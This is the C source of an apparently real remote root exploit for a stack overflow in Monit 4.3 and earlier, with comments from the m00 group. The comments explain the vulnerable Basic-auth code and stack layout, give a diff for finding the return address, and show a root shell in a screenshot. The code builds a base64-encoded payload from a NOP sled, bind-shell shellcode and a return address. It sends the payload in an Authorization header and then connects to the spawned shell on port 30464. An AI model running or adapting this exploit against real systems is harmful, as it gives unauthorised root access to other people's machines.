/*
 *  m00-blah.c
 *
 * Monit <=4.3 remote root exploit ~ for internal usage only
 *
 *
 ======[1]======> VULNERABILITY AND EXPLOITATION INFO
 *
 * monit-4.2/http/processor.c:
 *
 *  ..............
 *
 *  static int is_authenticated(HttpRequest req, HttpResponse res) {
 *
 *    if(Run.credentials!=NULL) {
 *
 *      if(! basic_authenticate(req)) {
 *        // executing basic_auth function and saving RET in the stack
 *          ...................
  *     }
 *
 *    }
 *
 *    return TRUE;
 *
 *  }
 *
 *
 *   static int basic_authenticate(HttpRequest req) {
 *
 *      int rv= FALSE;
 *      const char *credentials= get_header(req, "Authorization");
 *      // "Basic login:password" in credentials now.
 *
 *      if(credentials) {
 *
 *         unsigned char *cr= xcalloc(sizeof(unsigned char), strlen(credentials)+1);
 *         // allocating memory for decoded login:password.
 *
 *        if(decode_base64(cr, strchr(credentials, ' '))) {
 *        // now cr contains decoded "login:password"
 *
 *          char *passwd;
 *          char uname[STRLEN];
 *          // STRLEN == 256b
 *          long unamelen=(long) strchr(cr, ':') - (long) cr;
 *         // here we got a problem. For example If login will be 300 bytes long, unamelen
 *         // will be 300 too, but uname has a fixed size STRLEN (256) bytes.
 *
 *          strncpy(uname, cr, unamelen);
 *          // shit happens (c)
 *          // at this moment stack will be looks like (user name is 255 bytes long):
 *          //
 *          // 0x40b24870:     0x8088730      0x000000ff      0x00000109      0x0000000a
 *          //                           ^^^^^^^             ^^^^^^^
 *          //                        cr pointer;   long unamelen=(long) strchr(cr, ':') - (long) cr;
 *          // 0x40b24880:     0x400c6874      0x40b2492c      0x00000000      0x41414141
 *          // 0x40b24890:     0x41414141      0x41414141      0x41414141      0x41414141
 *          // 0x40b248a0:     0x41414141      0x41414141      0x41414141      0x41414141
 *          //         ....................
 *          // 0x40b24960:     0x41414141      0x41414141      0x41414141      0x41414141
 *          // 0x40b24970:     0x41414141      0x41414141      0x41414141      0x41414141
 *          // 0x40b24980:     0x41414141      0x41414141      0x08414141      0x00000001
 *          //                             ^^^^^^^^                                  ^^
 *          //                  char uname[STRLEN];      (will be 0x00 after "uname[unamelen]='\0';")
 *          // 0x40b24990:     0x00000028      0x00000000      0x0808a438      0x40b24be0
 *          // 0x40b249a0:     0x40b24c74      0x40b249c4      0x0805f0fc      0x0808a3b8
 *           //                                                                         ^^^^^^^
 *                                                                                       retaddr
 *          // we got 29 bytes between end of "char uname[STRLEN];" (uname+255) and
 *          // return address. So to exploit this stack overflow we need to send something like:
 *          // [..nops-and-shellcode..(255+29)bytes..][..ret..][":"][..any_string_(password)..]
 *          // As a retaddr we can use:
 *          //   1. cr pointer (0x8088730). Allows us to bypass non-execute stack protection.
 *          //   2. char uname[STRLEN]; (0x40b2488c)
 *          //   3. char *passwd; Shellcode must be placed in password-field after ":".
 *          //   4. const char *credentials= get_header(req, "Authorization"); (0x80891a0).
 *          // Anyway it's better to use cr pointer as retaddr..
 *          //
 *          // Notes:
 *          //   a. To use 4th retaddr we shouldnt need to encode nops and shellcode. Only retaddr.
 *          //   b. In all other ways we should encode "login:password" with base64.
 *          //   c. All addresses are 100% valid only for Mandrake 9.1 with gcc3.2.2
 *          //   d. shellcode must not contain 0x3a, 0x00, 0x0a, 0x0d
 *
 *          uname[unamelen]='\0';
 *
 *     .............
 *         }
 *
 *      FREE(cr);
 *
 *     }
 *
 *     return rv;
 *     // trying to return to is_authenticated().
 *  }
 *
 *
 *
 *
 =======[2]=======> HOW TO GET RETADDR
 *
 * First, patch http/processor.c with:
 *
  ---------[ret-finder.diff]---------
    21c21
    <
    ---
    > #include <unistd.h>
    131c131
    <
    ---
    > long get_esp();
    925c925,929
    <
    ---
    >       log("*cr addr: [\033[31m0x%x\033[0m]\n",cr+0x10);
    >       log("uname addr: [\033[31m0x%x\033[0m]\n",get_esp()+0x50);
    >       log("*passwd addr: [\033[31m0x%x\033[0m]\n",passwd+0x10);
    >       log("*credentials addr: [\033[31m0x%x\033[0m]\n",credentials+0x10);
    >
    1066a1071,1074
    >
    > long get_esp(){
    >       __asm__ ("movl %esp,%eax");
    > }
  ---------------[eof]---------------
 *
 * Then:
 *   1. ./configure;make
 *   2. edit monitrc
 *   3. ./monit -I
 *   4. in another console compile m00-blah.c and try to exploit localhost
 *    with the last target ("Get retaddr - read header").
 *   5. in 1st console you will see smth like:
 *    # ./monit -I
 *    Starting monit daemon
 *    Starting httpd at [localhost:your_port]
 *    *cr addr: [0x8088608]
 *    uname addr: [0x40b248b4]
 *    *passwd addr: [0x40b2492c]
 *    *credentials addr: [0x808a548]
 *    Segmentation fault
 *
 * Thats all.
 *
 *
 *
 *
 =======[3]=======> SCREENSHOT
 *
 * $ ./M -h localhost -p 2000 -t 0
 *
 * m00-blah.c ~ Monit <=v.4.3 remote root exploit
 * Internal m00 release / m00.void.ru / Do not distribute
 *
 * [*] Constructing login:password pair... done
 * [*] Encoding with Base64... done
 * => before 0x258 , after 0x320
 * [*] Connecting [localhost:2000]... done
 * [*] Sending evil l/p pair... done
 * [*] Sleeping... done
 * [*] Connecting to shell... done
 *
 * uid=0(root) gid=0(root) groups=0(root)
 *
 * Linux localhost 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686 unknown unknown GNU/Linux
 *
 *  19:19:41 up 1 day, 11:21,  7 users,  load average: 0.03, 0.04, 0.02
 * USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
 * satan    pts/0     Sat08   35:11m  0.00s  0.87s kdeinit: kwrited
 * satan    pts/1     14:54    7.00s  0.38s  0.18s /bin/bash
 * satan    pts/2     15:24   18.00s  0.23s  0.10s /bin/bash
 * satan    pts/3     15:24    3.00s  0.15s  0.00s ./M -h localhost -p 2000 -t 0
 * satan    pts/4     15:41    1:24m  0.20s  0.00s man
 * satan    pts/5     17:51    9:03   0.25s  0.25s /bin/bash
 *
 * 0_o
 * //bin/sh: line 2: 0_o: command not found
 *
 *
 =======[4]=======> LAST WORDS
 *
 * Check this out:
 *   http://www.security.nnov.ru/files/cobain-monit.pl
 * 2authors: well done kiddie. Lets heap up bugtraqs with fake crap&$()*#
 * 2all: cobain-monit.pl doesnt contain http-headers, base64 encoder.
 * I could hardly imagine how it can work..
 *
 * Greets to ppl from EFnet -> #m00, #nerf, #r00tsecurity, #!uhagr, etc.
 * Keep it private.
 *
 * -d4rkgr3y [d4rk@securitylab.ru] // m00.void.ru
 *
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

struct
{
	char *platform;
	long ret;
	//char *shellcode;
} targets[]=
{
	{"Monit 4.2 - Mandrake 9.1", 0x8088821/*, lnxshellcode*/}, //0x808856a
	{"Get retaddr - read header", 0xdefaced/*, lnxshellcode*/},
};

char lnxshellcode[] =
/* fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
"\x31\xc0"                	// xorl    %eax,%eax
"\x31\xdb"                	// xorl    %ebx,%ebx
"\x31\xc9"                	// xorl    %ecx,%ecx
"\x31\xd2"                	// xorl    %edx,%edx
"\xb0\x66"                	// movb    $0x66,%al
"\xb3\x01"                	// movb    $0x1,%bl
"\x51"                  	// pushl   %ecx
"\xb1\x06"                	// movb    $0x6,%cl
"\x51"                   	// pushl   %ecx
"\xb1\x01"                	// movb    $0x1,%cl
"\x51"                   	// pushl   %ecx
"\xb1\x02"                	// movb    $0x2,%cl
"\x51"                   	// pushl   %ecx
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\xcd\x80"                	// int     $0x80

/* port is 30464 !!! */
/* bind(fd, (struct sockaddr)&amp;sin,  sizeof(sin) ) */
"\xb3\x02"               	// movb    $0x2,%bl
"\xb1\x02"                	// movb    $0x2,%cl
"\x31\xc9"                	// xorl    %ecx,%ecx
"\x51"                   	// pushl   %ecx
"\x51"                   	// pushl   %ecx
"\x51"                   	// pushl   %ecx
/* port = 0x77, change if needed */
"\x80\xc1\x77"             	// addb    $0x77,%cl
"\x66\x51"                	// pushl   %cx
"\xb1\x02"                	// movb    $0x2,%cl
"\x66\x51"                	// pushw   %cx
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\xb2\x10"                	// movb    $0x10,%dl
"\x52"                   	// pushl   %edx
"\x51"                   	// pushl   %ecx
"\x50"                   	// pushl   %eax
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\x89\xc2"                	// movl    %eax,%edx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x66"                	// movb    $0x66,%al
"\xcd\x80"                	// int     $0x80

/* listen(fd, 1) */
"\xb3\x01"                	// movb    $0x1,%bl
"\x53"                   	// pushl   %ebx
"\x52"                   	// pushl   %edx
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x66"                	// movb    $0x66,%al
"\x80\xc3\x03"             	// addb    $0x3,%bl
"\xcd\x80"                	// int     $0x80

/* cli = accept(fd, 0, 0) */
"\x31\xc0"                	// xorl    %eax,%eax
"\x50"                   	// pushl   %eax
"\x50"                   	// pushl   %eax
"\x52"                   	// pushl   %edx
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\xb3\x05"                	// movl    $0x5,%bl
"\xb0\x66"                	// movl    $0x66,%al
"\xcd\x80"                	// int     $0x80

/* dup2(cli, 0) */
"\x89\xc3"                	// movl    %eax,%ebx
"\x31\xc9"                	// xorl    %ecx,%ecx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x3f"                	// movb    $0x3f,%al
"\xcd\x80"                	// int     $0x80

/* dup2(cli, 1) */
"\x41"                   	// inc     %ecx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x3f"                	// movl    $0x3f,%al
"\xcd\x80"                	// int     $0x80

/* dup2(cli, 2) */
"\x41"                   	// inc     %ecx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x3f"                	// movb    $0x3f,%al
"\xcd\x80"                	// int     $0x80

/* execve("//bin/sh", ["//bin/sh", NULL], NULL); */
"\x31\xdb"                	// xorl    %ebx,%ebx
"\x53"                   	// pushl   %ebx
"\x68\x6e\x2f\x73\x68"       	// pushl   $0x68732f6e
"\x68\x2f\x2f\x62\x69"       	// pushl   $0x69622f2f
"\x89\xe3"                	// movl    %esp,%ebx
"\x8d\x54\x24\x08"          	// leal    0x8(%esp),%edx
"\x31\xc9"                	// xorl    %ecx,%ecx
"\x51"                   	// pushl   %ecx
"\x53"                   	// pushl   %ebx
"\x8d\x0c\x24"             	// leal    (%esp),%ecx
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x0b"                	// movb    $0xb,%al
"\xcd\x80"                	// int     $0x80

/* exit(%ebx) */
"\x31\xc0"                	// xorl    %eax,%eax
"\xb0\x01"                	// movb    $0x1,%al
"\xcd\x80";                	// int     $0x80



static char encode(unsigned char u) {

  if(u < 26)  return 'A'+u;
  if(u < 52)  return 'a'+(u-26);
  if(u < 62)  return '0'+(u-52);
  if(u == 62) return '+';

  return '/';

}

void *xcalloc(long count, long nbytes) {
	void *p;
	p=(void *)calloc(count, nbytes);
	if (p == NULL)
		exit(1);
	return p;
}

char *encode_base64(int size, unsigned char *src) {

  int i;
  char *out, *p;

  if(!src)
    return NULL;

  if(!size)
    size= strlen((char *)src);

  out = xcalloc(sizeof(char), size*4/3+4);

  p=out;

  for(i=0; i<size; i+=3) {

    unsigned char b1=0, b2=0, b3=0, b4=0, b5=0, b6=0, b7=0;

    b1 = src[i];

    if(i+1<size)
      b2 = src[i+1];

    if(i+2<size)
      b3 = src[i+2];

    b4= b1>>2;
    b5= ((b1&0x3)<<4)|(b2>>4);
    b6= ((b2&0xf)<<2)|(b3>>6);
    b7= b3&0x3f;

    *p++= encode(b4);
    *p++= encode(b5);

    if(i+1<size) {
      *p++= encode(b6);
    } else {
      *p++= '=';
    }

    if(i+2<size) {
      *p++= encode(b7);
    } else {
      *p++= '=';
    }

  }

  return out;

}

int conn(char *ip, unsigned short port) {
	struct hostent *hs;
	struct sockaddr_in sock;
	int sockfd;
	bzero(&sock, sizeof(sock));
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ((sock.sin_addr.s_addr=inet_addr(ip))==-1) {
		if ((hs=gethostbyname(ip))==NULL) {
			return -1;
		}
		sock.sin_family = hs->h_addrtype;
		memcpy((caddr_t)&sock.sin_addr.s_addr,hs->h_addr,hs->h_length);
	}
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		return -1;
	}
	if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0){
		return -1;
	}
	return(sockfd);
}

int get_shell(int bsh)
{
	fd_set rfds;
	int retVal,r;
	char buf[8096];
	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(bsh, &rfds);
		retVal=select(bsh+1, &rfds, NULL, NULL, NULL);
		if(retVal) {
			if(FD_ISSET(bsh, &rfds)) {

				buf[(r=recv(bsh, buf, 8095,0))]='\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, 8095))]='\0';
				send(bsh, buf, strlen(buf), 0);
			}
		}
	} while(retVal && r);

	close(bsh);
	return 1;
}

int usage(char *prog) {
	int i;
	printf("[*] Usage: %s -h <host> -p <port> -t <target>\n\n",prog);
	printf("[*] Available targets:\n");
	for(i=0;i<2;i++) {
		printf("   %i %s\n", i, targets[i].platform);
	}
	printf("\n");
	exit(0);
}


int main(int argc, char *argv[]) {
	int port=0;
	int c,t,hand;
	char *host=NULL;
	char request[2500];
	char buf[530];
	char *encoded_buf;
	char answer[0x3e9];

	char *http =
		"Accept: */*\r\n"
		"Accept-Language: en-us,en;q=0.5\r\n"
		"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
		"User-Agent: m00-ownz-you\r\n"
		"Keep-Alive: 300\r\n"
		"Connection: keep-alive\r\n"
		"Authorization: Basic ";

	printf("\nm00-blah.c ~ Monit <=v.4.3 remote root exploit\nInternal m00 release / m00.void.ru / Do not distribute\n\n");

	if(argc<6) usage(argv[0]);
	while((c = getopt(argc, argv, "h:p:t:"))!= EOF) {
		switch (c) {
			case 'h':
				host=optarg;
				break;
			case 'p':
				port=atoi(optarg);
				break;
			case 't':
				t=atoi(optarg);
				break;
			default:
				usage(argv[0]);
				return 1;
		}
	}

	if(host==NULL || !port) usage(argv[0]);
	printf("[*] Constructing login:password pair... ");

 /*
	memset(buf,'A',254);
	memset(buf+254,':',1);
	memset(buf+255,'B',1);
 */

	memset(buf,'\x90',284-strlen(lnxshellcode)-16);
	memcpy(buf+284-strlen(lnxshellcode)-16,lnxshellcode,strlen(lnxshellcode));
	memset(buf+284-16,'\x90',16);
	memcpy(buf+284,(char *)&targets[t].ret,4); // EIP
	memset(buf+288,'\x41',312);
	memset(buf+500,':',1);
	memset(buf+501,'\x42',16);

	printf("done\n[*] Encoding with Base64... ");

	if(!(encoded_buf = encode_base64(strlen(buf), buf))) { printf("damn\n\n"); exit(0); }

	printf("done\n");
	printf("=> before 0x%x , after 0x%x\n",strlen(buf),strlen(encoded_buf));
	printf("[*] Connecting [%s:%i]... ",host,port);

	if((hand = conn(host,port))==-1) { printf("damn\n\n"); exit(0); }
	printf("done\n");
	sprintf(request,"GET / HTTP/1.1\r\nHost: %s:%d\r\n%s%s\r\n\r\n",host,port,http,encoded_buf);
	printf("[*] Sending evil l/p pair... ");
	write(hand,request,strlen(request));
	printf("done\n[*] Sleeping... ");
	close(hand);
	sleep(3);
	printf("done\n[*] Connecting to shell... ");
	if((hand = conn(host,30464))==-1) { printf("damn\n\n"); exit(0); }
	printf("done\n\n");
	write(hand,"id;uname -a;echo;w;echo;\n",25);
	memset(buf,'\x00',530);
	recv(hand,buf,529,0);
	printf("%s\n",buf);
	get_shell(hand);
	//close(hand);
	/* end */

	printf("\n[*] Complete.\n");

}
/* m00 */
